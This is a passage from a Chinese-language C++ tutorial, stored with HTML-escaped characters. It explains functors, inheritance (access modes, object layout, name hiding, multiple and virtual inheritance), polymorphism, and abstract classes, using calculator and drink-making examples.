也可以重载\n由于重载后使用的方式非常像函数的调用，因此称为仿函数\n仿函数没有固定写法，非常灵活\n\n示例：\nclass MyPrint\n&#123;\npublic:\n\tvoid operator()(string text)\n\t&#123;\n\t\tcout &lt;&lt; text &lt;&lt; endl;\n\t&#125;\n\n&#125;;\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;重载的（）操作符 也称为仿函数\n\tMyPrint myFunc;\n\tmyFunc(&quot;hello world&quot;);\n&#125;\n\n\nclass MyAdd\n&#123;\npublic:\n\tint operator()(int v1, int v2)\n\t&#123;\n\t\treturn v1 + v2;\n\t&#125;\n&#125;;\n\nvoid test02()\n&#123;\n\tMyAdd add;\n\tint ret &#x3D; add(10, 10);\n\tcout &lt;&lt; &quot;ret &#x3D; &quot; &lt;&lt; ret &lt;&lt; endl;\n\n\t&#x2F;&#x2F;匿名对象调用  \n\tcout &lt;&lt; &quot;MyAdd()(100,100) &#x3D; &quot; &lt;&lt; MyAdd()(100, 100) &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\ttest02();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n继承继承是面向对象三大特性之一\n有些类与类之间存在特殊的关系\n我们发现，定义这些类时，下级别的成员除了拥有上一级的共性，还有自己的特性。\n这个时候我们就可以考虑利用继承的技术，减少重复代码\n继承的基本语法例如我们看到很多网站中，都有公共的头部，公共的底部，甚至公共的左侧列表，只有中心内容不同\n接下来我们分别利用普通写法和继承的写法来实现网页中的内容，看一下继承存在的意义以及好处\n普通实现：\n&#x2F;&#x2F;Java页面\nclass Java \n&#123;\npublic:\n\tvoid header()\n\t&#123;\n\t\tcout &lt;&lt; &quot;首页、公开课、登录、注册...（公共头部）&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid footer()\n\t&#123;\n\t\tcout &lt;&lt; &quot;帮助中心、交流合作、站内地图...(公共底部)&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid left()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Java,Python,C++...(公共分类列表)&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid content()\n\t&#123;\n\t\tcout &lt;&lt; &quot;JAVA学科视频&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n&#x2F;&#x2F;Python页面\nclass Python\n&#123;\npublic:\n\tvoid header()\n\t&#123;\n\t\tcout &lt;&lt; &quot;首页、公开课、登录、注册...（公共头部）&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid footer()\n\t&#123;\n\t\tcout &lt;&lt; &quot;帮助中心、交流合作、站内地图...(公共底部)&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid left()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Java,Python,C++...(公共分类列表)&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid content()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Python学科视频&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n&#x2F;&#x2F;C++页面\nclass CPP \n&#123;\npublic:\n\tvoid header()\n\t&#123;\n\t\tcout &lt;&lt; &quot;首页、公开课、登录、注册...（公共头部）&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid footer()\n\t&#123;\n\t\tcout &lt;&lt; &quot;帮助中心、交流合作、站内地图...(公共底部)&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid left()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Java,Python,C++...(公共分类列表)&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid content()\n\t&#123;\n\t\tcout &lt;&lt; &quot;C++学科视频&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;Java页面\n\tcout &lt;&lt; &quot;Java下载视频页面如下： &quot; &lt;&lt; endl;\n\tJava ja;\n\tja.header();\n\tja.footer();\n\tja.left();\n\tja.content();\n\tcout &lt;&lt; &quot;--------------------&quot; &lt;&lt; endl;\n\n\t&#x2F;&#x2F;Python页面\n\tcout &lt;&lt; &quot;Python下载视频页面如下： &quot; &lt;&lt; endl;\n\tPython py;\n\tpy.header();\n\tpy.footer();\n\tpy.left();\n\tpy.content();\n\tcout &lt;&lt; &quot;--------------------&quot; &lt;&lt; endl;\n\n\t&#x2F;&#x2F;C++页面\n\tcout &lt;&lt; &quot;C++下载视频页面如下： &quot; &lt;&lt; endl;\n\tCPP cp;\n\tcp.header();\n\tcp.footer();\n\tcp.left();\n\tcp.content();\n\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n继承实现：\n&#x2F;&#x2F;公共页面\nclass BasePage\n&#123;\npublic:\n\tvoid header()\n\t&#123;\n\t\tcout &lt;&lt; &quot;首页、公开课、登录、注册...（公共头部）&quot; &lt;&lt; endl;\n\t&#125;\n\n\tvoid footer()\n\t&#123;\n\t\tcout &lt;&lt; &quot;帮助中心、交流合作、站内地图...(公共底部)&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid left()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Java,Python,C++...(公共分类列表)&quot; &lt;&lt; endl;\n\t&#125;\n\n&#125;;\n\n&#x2F;&#x2F;Java页面\nclass Java : public BasePage\n&#123;\npublic:\n\tvoid content()\n\t&#123;\n\t\tcout &lt;&lt; &quot;JAVA学科视频&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n&#x2F;&#x2F;Python页面\nclass Python : public BasePage\n&#123;\npublic:\n\tvoid content()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Python学科视频&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n&#x2F;&#x2F;C++页面\nclass CPP : public BasePage\n&#123;\npublic:\n\tvoid content()\n\t&#123;\n\t\tcout &lt;&lt; &quot;C++学科视频&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;Java页面\n\tcout &lt;&lt; &quot;Java下载视频页面如下： &quot; &lt;&lt; endl;\n\tJava ja;\n\tja.header();\n\tja.footer();\n\tja.left();\n\tja.content();\n\tcout &lt;&lt; &quot;--------------------&quot; &lt;&lt; endl;\n\n\t&#x2F;&#x2F;Python页面\n\tcout &lt;&lt; &quot;Python下载视频页面如下： &quot; &lt;&lt; endl;\n\tPython py;\n\tpy.header();\n\tpy.footer();\n\tpy.left();\n\tpy.content();\n\tcout &lt;&lt; &quot;--------------------&quot; &lt;&lt; endl;\n\n\t&#x2F;&#x2F;C++页面\n\tcout &lt;&lt; &quot;C++下载视频页面如下： &quot; &lt;&lt; endl;\n\tCPP cp;\n\tcp.header();\n\tcp.footer();\n\tcp.left();\n\tcp.content();\n\n\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n总结：\n继承的好处：&#x3D;&#x3D;可以减少重复的代码&#x3D;&#x3D;\nclass A : public B;\nA 类称为子类 或 派生类\nB 类称为父类 或 基类\n派生类中的成员，包含两大部分：\n一类是从基类继承过来的，一类是自己增加的成员。\n从基类继承过过来的表现其共性，而新增的成员体现了其个性。\n继承方式继承的语法：class 子类 : 继承方式 父类\n继承方式一共有三种：\n\n公共继承\n保护继承\n私有继承\n\n示例：\nclass Base1\n&#123;\npublic: \n\tint m_A;\nprotected:\n\tint m_B;\nprivate:\n\tint m_C;\n&#125;;\n\n&#x2F;&#x2F;公共继承\nclass Son1 :public Base1\n&#123;\npublic:\n\tvoid func()\n\t&#123;\n\t\tm_A; &#x2F;&#x2F;可访问 public权限\n\t\tm_B; &#x2F;&#x2F;可访问 protected权限\n\t\t&#x2F;&#x2F;m_C; &#x2F;&#x2F;不可访问\n\t&#125;\n&#125;;\n\nvoid myClass()\n&#123;\n\tSon1 s1;\n\ts1.m_A; &#x2F;&#x2F;其他类只能访问到公共权限\n&#125;\n\n&#x2F;&#x2F;保护继承\nclass Base2\n&#123;\npublic:\n\tint m_A;\nprotected:\n\tint m_B;\nprivate:\n\tint m_C;\n&#125;;\nclass Son2:protected Base2\n&#123;\npublic:\n\tvoid func()\n\t&#123;\n\t\tm_A; &#x2F;&#x2F;可访问 protected权限\n\t\tm_B; &#x2F;&#x2F;可访问 protected权限\n\t\t&#x2F;&#x2F;m_C; &#x2F;&#x2F;不可访问\n\t&#125;\n&#125;;\nvoid myClass2()\n&#123;\n\tSon2 s;\n\t&#x2F;&#x2F;s.m_A; &#x2F;&#x2F;不可访问\n&#125;\n\n&#x2F;&#x2F;私有继承\nclass Base3\n&#123;\npublic:\n\tint m_A;\nprotected:\n\tint m_B;\nprivate:\n\tint m_C;\n&#125;;\nclass Son3:private Base3\n&#123;\npublic:\n\tvoid func()\n\t&#123;\n\t\tm_A; &#x2F;&#x2F;可访问 private权限\n\t\tm_B; &#x2F;&#x2F;可访问 private权限\n\t\t&#x2F;&#x2F;m_C; &#x2F;&#x2F;不可访问\n\t&#125;\n&#125;;\nclass GrandSon3 :public Son3\n&#123;\npublic:\n\tvoid func()\n\t&#123;\n\t\t&#x2F;&#x2F;Son3是私有继承，所以继承Son3的属性在GrandSon3中都无法访问到\n\t\t&#x2F;&#x2F;m_A;\n\t\t&#x2F;&#x2F;m_B;\n\t\t&#x2F;&#x2F;m_C;\n\t&#125;\n&#125;;\n\n继承中的对象模型问题：从父类继承过来的成员，哪些属于子类对象中？\n示例：\nclass Base\n&#123;\npublic:\n\tint m_A;\nprotected:\n\tint m_B;\nprivate:\n\tint m_C; &#x2F;&#x2F;私有成员只是被隐藏了，但是还是会继承下去\n&#125;;\n\n&#x2F;&#x2F;公共继承\nclass Son :public Base\n&#123;\npublic:\n\tint m_D;\n&#125;;\n\nvoid test01()\n&#123;\n\tcout &lt;&lt; &quot;sizeof Son &#x3D; &quot; &lt;&lt; sizeof(Son) &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n利用工具查看：\nVisual Studio下有名称为“开发人员的命令提示符”\n打开工具窗口后，定位到当前CPP文件的盘符\n然后输入： cl &#x2F;d1 reportSingleClassLayoutSon查看的类名 所属文件名\n*************************************************************\nC:\\Program Files (x86)\\Microsoft Visual Studio\\Community&gt;F:\nF:\\&gt;cd F:\\VS项目\\继承\\\nF:\\&gt;cd F:\\VS项目\\继承\\cl &#x2F;d1 reportSingleClassLayoutSon &quot;继承中的对象模型.cpp&quot;\n\n\n\n\n\n\n\n\n\n\n结论： 父类中私有成员也是被子类继承下去了，只是由编译器给隐藏后访问不到\n继承中构造和析构顺序子类继承父类后，当创建子类对象，也会调用父类的构造函数\n问题：父类和子类的构造和析构顺序是谁先谁后？\n示例：\nclass Base \n&#123;\npublic:\n\tBase()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Base构造函数!&quot; &lt;&lt; endl;\n\t&#125;\n\t~Base()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Base析构函数!&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nclass Son : public Base\n&#123;\npublic:\n\tSon()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Son构造函数!&quot; &lt;&lt; endl;\n\t&#125;\n\t~Son()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Son析构函数!&quot; &lt;&lt; endl;\n\t&#125;\n\n&#125;;\n\n\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;继承中 先调用父类构造函数，再调用子类构造函数，析构顺序与构造相反\n\tSon s;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\n总结：继承中 先调用父类构造函数，再调用子类构造函数，析构顺序与构造相反\n继承同名成员处理方式问题：当子类与父类出现同名的成员，如何通过子类对象，访问到子类或父类中同名的数据呢？\n\n访问子类同名成员 直接访问即可\n访问父类同名成员 需要加作用域\n\n示例：\nclass Base &#123;\npublic:\n\tBase()\n\t&#123;\n\t\tm_A &#x3D; 100;\n\t&#125;\n\n\tvoid func()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Base - func()调用&quot; &lt;&lt; endl;\n\t&#125;\n\n\tvoid func(int a)\n\t&#123;\n\t\tcout &lt;&lt; &quot;Base - func(int a)调用&quot; &lt;&lt; endl;\n\t&#125;\n\npublic:\n\tint m_A;\n&#125;;\n\n\nclass Son : public Base &#123;\npublic:\n\tSon()\n\t&#123;\n\t\tm_A &#x3D; 200;\n\t&#125;\n\n\t&#x2F;&#x2F;当子类与父类拥有同名的成员函数，子类会隐藏父类中所有版本的同名成员函数\n\t&#x2F;&#x2F;如果想访问父类中被隐藏的同名成员函数，需要加父类的作用域\n\tvoid func()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Son - func()调用&quot; &lt;&lt; endl;\n\t&#125;\npublic:\n\tint m_A;\n&#125;;\n\nvoid test01()\n&#123;\n\tSon s;\n\n\tcout &lt;&lt; &quot;Son下的m_A &#x3D; &quot; &lt;&lt; s.m_A &lt;&lt; endl;\n\tcout &lt;&lt; &quot;Base下的m_A &#x3D; &quot; &lt;&lt; s.Base::m_A &lt;&lt; endl;\n\n\ts.func();\n\ts.Base::func();\n\ts.Base::func(10);\n\n&#125;\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\treturn EXIT_SUCCESS;\n&#125;\n\n总结：\n\n子类对象可以直接访问到子类中同名成员\n子类对象加作用域可以访问到父类同名成员\n当子类与父类拥有同名的成员函数，子类会隐藏父类中同名成员函数，加作用域可以访问到父类中同名函数\n\n继承同名静态成员处理方式问题：继承中同名的静态成员在子类对象上如何进行访问？\n静态成员和非静态成员出现同名，处理方式一致\n\n访问子类同名成员 直接访问即可\n访问父类同名成员 需要加作用域\n\n示例：\nclass Base &#123;\npublic:\n\tstatic void func()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Base - static void func()&quot; &lt;&lt; endl;\n\t&#125;\n\tstatic void func(int a)\n\t&#123;\n\t\tcout &lt;&lt; &quot;Base - static void func(int a)&quot; &lt;&lt; endl;\n\t&#125;\n\n\tstatic int m_A;\n&#125;;\n\nint Base::m_A &#x3D; 100;\n\nclass Son : public Base &#123;\npublic:\n\tstatic void func()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Son - static void func()&quot; &lt;&lt; endl;\n\t&#125;\n\tstatic int m_A;\n&#125;;\n\nint Son::m_A &#x3D; 200;\n\n&#x2F;&#x2F;同名成员属性\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;通过对象访问\n\tcout &lt;&lt; &quot;通过对象访问： &quot; &lt;&lt; endl;\n\tSon s;\n\tcout &lt;&lt; &quot;Son  下 m_A &#x3D; &quot; &lt;&lt; s.m_A &lt;&lt; endl;\n\tcout &lt;&lt; &quot;Base 下 m_A &#x3D; &quot; &lt;&lt; s.Base::m_A &lt;&lt; endl;\n\n\t&#x2F;&#x2F;通过类名访问\n\tcout &lt;&lt; &quot;通过类名访问： &quot; &lt;&lt; endl;\n\tcout &lt;&lt; &quot;Son  下 m_A &#x3D; &quot; &lt;&lt; Son::m_A &lt;&lt; endl;\n\tcout &lt;&lt; &quot;Base 下 m_A &#x3D; &quot; &lt;&lt; Son::Base::m_A &lt;&lt; endl;\n&#125;\n\n&#x2F;&#x2F;同名成员函数\nvoid test02()\n&#123;\n\t&#x2F;&#x2F;通过对象访问\n\tcout &lt;&lt; &quot;通过对象访问： &quot; &lt;&lt; endl;\n\tSon s;\n\ts.func();\n\ts.Base::func();\n\n\tcout &lt;&lt; &quot;通过类名访问： &quot; &lt;&lt; endl;\n\tSon::func();\n\tSon::Base::func();\n\t&#x2F;&#x2F;出现同名，子类会隐藏掉父类中所有同名成员函数，需要加作作用域访问\n\tSon::Base::func(100);\n&#125;\nint main() &#123;\n\n\t&#x2F;&#x2F;test01();\n\ttest02();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\n总结：同名静态成员处理方式和非静态处理方式一样，只不过有两种访问的方式（通过对象 和 通过类名）\n多继承语法C++允许一个类继承多个类\n语法： class 子类 ：继承方式 父类1 ， 继承方式 父类2...\n多继承可能会引发父类中有同名成员出现，需要加作用域区分\nC++实际开发中不建议用多继承\n示例：\nclass Base1 &#123;\npublic:\n\tBase1()\n\t&#123;\n\t\tm_A &#x3D; 100;\n\t&#125;\npublic:\n\tint m_A;\n&#125;;\n\nclass Base2 &#123;\npublic:\n\tBase2()\n\t&#123;\n\t\tm_A &#x3D; 200;  &#x2F;&#x2F;开始是m_B 不会出问题，但是改为mA就会出现不明确\n\t&#125;\npublic:\n\tint m_A;\n&#125;;\n\n&#x2F;&#x2F;语法：class 子类：继承方式 父类1 ，继承方式 父类2 \nclass Son : public Base2, public Base1 \n&#123;\npublic:\n\tSon()\n\t&#123;\n\t\tm_C &#x3D; 300;\n\t\tm_D &#x3D; 400;\n\t&#125;\npublic:\n\tint m_C;\n\tint m_D;\n&#125;;\n\n\n&#x2F;&#x2F;多继承容易产生成员同名的情况\n&#x2F;&#x2F;通过使用类名作用域可以区分调用哪一个基类的成员\nvoid test01()\n&#123;\n\tSon s;\n\tcout &lt;&lt; &quot;sizeof Son &#x3D; &quot; &lt;&lt; sizeof(s) &lt;&lt; endl;\n\tcout &lt;&lt; s.Base1::m_A &lt;&lt; endl;\n\tcout &lt;&lt; s.Base2::m_A &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\n总结： 多继承中如果父类中出现了同名情况，子类使用时候要加作用域\n菱形继承菱形继承概念：\n两个派生类继承同一个基类\n又有某个类同时继承者两个派生类\n这种继承被称为菱形继承，或者钻石继承\n菱形继承问题案例：\n羊继承了动物的数据，驼同样继承了动物的数据，当草泥马使用数据时，就会产生二义性。草泥马继承自动物的数据继承了两份，其实我们应该清楚，这份数据我们只需要一份就可以。\n示例：\nclass Animal\n&#123;\npublic:\n\tint m_Age;\n&#125;;\n\n&#x2F;&#x2F;继承前加virtual关键字后，变为虚继承\n&#x2F;&#x2F;此时公共的父类Animal称为虚基类\nclass Sheep : virtual public Animal &#123;&#125;;\nclass Tuo   : virtual public Animal &#123;&#125;;\nclass SheepTuo : public Sheep, public Tuo &#123;&#125;;\n\nvoid test01()\n&#123;\n\tSheepTuo st;\n\tst.Sheep::m_Age &#x3D; 100;\n\tst.Tuo::m_Age &#x3D; 200;\n\n\tcout &lt;&lt; &quot;st.Sheep::m_Age &#x3D; &quot; &lt;&lt; st.Sheep::m_Age &lt;&lt; endl;\n\tcout &lt;&lt; &quot;st.Tuo::m_Age &#x3D; &quot; &lt;&lt;  st.Tuo::m_Age &lt;&lt; endl;\n\tcout &lt;&lt; &quot;st.m_Age &#x3D; &quot; &lt;&lt; st.m_Age &lt;&lt; endl;\n&#125;\n\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n总结：\n\n菱形继承带来的主要问题是子类继承两份相同的数据，导致资源浪费以及毫无意义\n利用虚继承可以解决菱形继承问题\n\n多态多态的基本概念多态是C++面向对象三大特性之一\n多态分为两类\n\n静态多态: 函数重载 和 运算符重载属于静态多态，复用函数名\n动态多态: 派生类和虚函数实现运行时多态\n\n静态多态和动态多态区别：\n\n静态多态的函数地址早绑定 - 编译阶段确定函数地址\n动态多态的函数地址晚绑定 - 运行阶段确定函数地址\n\n下面通过案例进行讲解多态\nclass Animal\n&#123;\npublic:\n\t&#x2F;&#x2F;Speak函数就是虚函数\n\t&#x2F;&#x2F;函数前面加上virtual关键字，变成虚函数，那么编译器在编译的时候就不能确定函数调用了。\n\tvirtual void speak()\n\t&#123;\n\t\tcout &lt;&lt; &quot;动物在说话&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nclass Cat :public Animal\n&#123;\npublic:\n\tvoid speak()\n\t&#123;\n\t\tcout &lt;&lt; &quot;小猫在说话&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nclass Dog :public Animal\n&#123;\npublic:\n\n\tvoid speak()\n\t&#123;\n\t\tcout &lt;&lt; &quot;小狗在说话&quot; &lt;&lt; endl;\n\t&#125;\n\n&#125;;\n&#x2F;&#x2F;我们希望传入什么对象，那么就调用什么对象的函数\n&#x2F;&#x2F;如果函数地址在编译阶段就能确定，那么静态联编\n&#x2F;&#x2F;如果函数地址在运行阶段才能确定，就是动态联编\n\nvoid DoSpeak(Animal &amp; animal)\n&#123;\n\tanimal.speak();\n&#125;\n&#x2F;&#x2F;\n&#x2F;&#x2F;多态满足条件： \n&#x2F;&#x2F;1、有继承关系\n&#x2F;&#x2F;2、子类重写父类中的虚函数\n&#x2F;&#x2F;多态使用：\n&#x2F;&#x2F;父类指针或引用指向子类对象\n\nvoid test01()\n&#123;\n\tCat cat;\n\tDoSpeak(cat);\n\n\n\tDog dog;\n\tDoSpeak(dog);\n&#125;\n\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n总结：\n多态满足条件\n\n有继承关系\n子类重写父类中的虚函数\n\n多态使用条件\n\n父类指针或引用指向子类对象\n\n重写：函数返回值类型 函数名 参数列表 完全一致称为重写\n多态案例一-计算器类案例描述：\n分别利用普通写法和多态技术，设计实现两个操作数进行运算的计算器类\n多态的优点：\n\n代码组织结构清晰\n可读性强\n利于前期和后期的扩展以及维护\n\n示例：\n&#x2F;&#x2F;普通实现\nclass Calculator &#123;\npublic:\n\tint getResult(string oper)\n\t&#123;\n\t\tif (oper &#x3D;&#x3D; &quot;+&quot;) &#123;\n\t\t\treturn m_Num1 + m_Num2;\n\t\t&#125;\n\t\telse if (oper &#x3D;&#x3D; &quot;-&quot;) &#123;\n\t\t\treturn m_Num1 - m_Num2;\n\t\t&#125;\n\t\telse if (oper &#x3D;&#x3D; &quot;*&quot;) &#123;\n\t\t\treturn m_Num1 * m_Num2;\n\t\t&#125;\n\t\t&#x2F;&#x2F;如果要提供新的运算，需要修改源码\n\t&#125;\npublic:\n\tint m_Num1;\n\tint m_Num2;\n&#125;;\n\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;普通实现测试\n\tCalculator c;\n\tc.m_Num1 &#x3D; 10;\n\tc.m_Num2 &#x3D; 10;\n\tcout &lt;&lt; c.m_Num1 &lt;&lt; &quot; + &quot; &lt;&lt; c.m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; c.getResult(&quot;+&quot;) &lt;&lt; endl;\n\n\tcout &lt;&lt; c.m_Num1 &lt;&lt; &quot; - &quot; &lt;&lt; c.m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; c.getResult(&quot;-&quot;) &lt;&lt; endl;\n\n\tcout &lt;&lt; c.m_Num1 &lt;&lt; &quot; * &quot; &lt;&lt; c.m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; c.getResult(&quot;*&quot;) &lt;&lt; endl;\n&#125;\n\n\n\n&#x2F;&#x2F;多态实现\n&#x2F;&#x2F;抽象计算器类\n&#x2F;&#x2F;多态优点：代码组织结构清晰，可读性强，利于前期和后期的扩展以及维护\nclass AbstractCalculator\n&#123;\npublic :\n\n\tvirtual int getResult()\n\t&#123;\n\t\treturn 0;\n\t&#125;\n\n\tint m_Num1;\n\tint m_Num2;\n&#125;;\n\n&#x2F;&#x2F;加法计算器\nclass AddCalculator :public AbstractCalculator\n&#123;\npublic:\n\tint getResult()\n\t&#123;\n\t\treturn m_Num1 + m_Num2;\n\t&#125;\n&#125;;\n\n&#x2F;&#x2F;减法计算器\nclass SubCalculator :public AbstractCalculator\n&#123;\npublic:\n\tint getResult()\n\t&#123;\n\t\treturn m_Num1 - m_Num2;\n\t&#125;\n&#125;;\n\n&#x2F;&#x2F;乘法计算器\nclass MulCalculator :public AbstractCalculator\n&#123;\npublic:\n\tint getResult()\n\t&#123;\n\t\treturn m_Num1 * m_Num2;\n\t&#125;\n&#125;;\n\n\nvoid test02()\n&#123;\n\t&#x2F;&#x2F;创建加法计算器\n\tAbstractCalculator *abc &#x3D; new AddCalculator;\n\tabc-&gt;m_Num1 &#x3D; 10;\n\tabc-&gt;m_Num2 &#x3D; 10;\n\tcout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; &quot; + &quot; &lt;&lt; abc-&gt;m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; abc-&gt;getResult() &lt;&lt; endl;\n\tdelete abc;  &#x2F;&#x2F;用完了记得销毁\n\n\t&#x2F;&#x2F;创建减法计算器\n\tabc &#x3D; new SubCalculator;\n\tabc-&gt;m_Num1 &#x3D; 10;\n\tabc-&gt;m_Num2 &#x3D; 10;\n\tcout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; &quot; - &quot; &lt;&lt; abc-&gt;m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; abc-&gt;getResult() &lt;&lt; endl;\n\tdelete abc;  \n\n\t&#x2F;&#x2F;创建乘法计算器\n\tabc &#x3D; new MulCalculator;\n\tabc-&gt;m_Num1 &#x3D; 10;\n\tabc-&gt;m_Num2 &#x3D; 10;\n\tcout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; &quot; * &quot; &lt;&lt; abc-&gt;m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; abc-&gt;getResult() &lt;&lt; endl;\n\tdelete abc;\n&#125;\n\nint main() &#123;\n\n\t&#x2F;&#x2F;test01();\n\n\ttest02();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\n总结：C++开发提倡利用多态设计程序架构，因为多态优点很多\n纯虚函数和抽象类在多态中，通常父类中虚函数的实现是毫无意义的，主要都是调用子类重写的内容\n因此可以将虚函数改为纯虚函数\n纯虚函数语法：virtual 返回值类型 函数名 （参数列表）= 0 ;\n当类中有了纯虚函数，这个类也称为&#x3D;&#x3D;抽象类&#x3D;&#x3D;\n抽象类特点：\n\n无法实例化对象\n子类必须重写抽象类中的纯虚函数，否则也属于抽象类\n\n示例：\nclass Base\n&#123;\npublic:\n\t&#x2F;&#x2F;纯虚函数\n\t&#x2F;&#x2F;类中只要有一个纯虚函数就称为抽象类\n\t&#x2F;&#x2F;抽象类无法实例化对象\n\t&#x2F;&#x2F;子类必须重写父类中的纯虚函数，否则也属于抽象类\n\tvirtual void func() &#x3D; 0;\n&#125;;\n\nclass Son :public Base\n&#123;\npublic:\n\tvirtual void func() \n\t&#123;\n\t\tcout &lt;&lt; &quot;func调用&quot; &lt;&lt; endl;\n\t&#125;;\n&#125;;\n\nvoid test01()\n&#123;\n\tBase * base &#x3D; NULL;\n\t&#x2F;&#x2F;base &#x3D; new Base; &#x2F;&#x2F; 错误，抽象类无法实例化对象\n\tbase &#x3D; new Son;\n\tbase-&gt;func();\n\tdelete base;&#x2F;&#x2F;记得销毁\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n多态案例二-制作饮品案例描述：\n制作饮品的大致流程为：煮水 - 冲泡 - 倒入杯中 - 加入辅料\n利用多态技术实现本案例，提供抽象制作饮品基类，提供子类制作咖啡和茶叶\n&#x2F;&#x2F;抽象制作饮品\nclass AbstractDrinking &#123;\npublic:\n\t&#x2F;&#x2F;烧水\n\tvirtual void Boil() &#x3D; 0;\n\t&#x2F;&#x2F;冲泡\n\tvirtual void Brew() &#x3D; 0;\n\t&#x2F;&#x2F;倒入杯中\n\tvirtual void PourInCup() &#x3D; 0;\n\t&#x2F;&#x2F;加入辅料\n\tvirtual void PutSomething() &#x3D; 0;\n\t&#x2F;&#x2F;规定流程\n\tvoid MakeDrink() &#123;\n\t\tBoil();\n\t\tBrew();\n\t\tPourInCup();\n\t\tPutSomething();\n\t&#125;\n&#125;;\n\n&#x2F;&#x2F;制作咖啡\nclass Coffee : public AbstractDrinking &#123;\npublic:\n\t&#x2F;&#x2F;烧水\n\tvirtual void Boil() &#123;\n\t\tcout &lt;&lt; &quot;煮农夫山泉!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;冲泡\n\tvirtual void Brew() &#123;\n\t\tcout &lt;&lt; &quot;冲泡咖啡!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;倒入杯中\n\tvirtual void PourInCup() &#123;\n\t\tcout &lt;&lt; &quot;将咖啡倒入杯中!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;加入辅料\n\tvirtual void PutSomething() &#123;\n\t\tcout &lt;&lt; &quot;加入牛奶!&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\n&#x2F;&#x2F;制作茶水\nclass Tea : public AbstractDrinking &#123;\npublic:\n\t&#x2F;&#x2F;烧水\n\tvirtual void Boil() &#123;\n\t\tcout &lt;&lt; &quot;煮自来水!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;冲泡\n\tvirtual void Brew() &#123;\n\t\tcout &lt;&lt; &quot;冲泡茶叶!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;倒入杯中\n\tvirtual void PourInCup() &#123;\n\t\tcout &lt;&lt; &quot;将茶水倒入杯中!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;加入辅料\n\tvirtual void PutSomething() &#123;\n\t\tcout &lt;&lt; &quot;加入枸杞!&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\n&#x2F;&#x2F;业务函数\nvoid DoWork(AbstractDrinking* 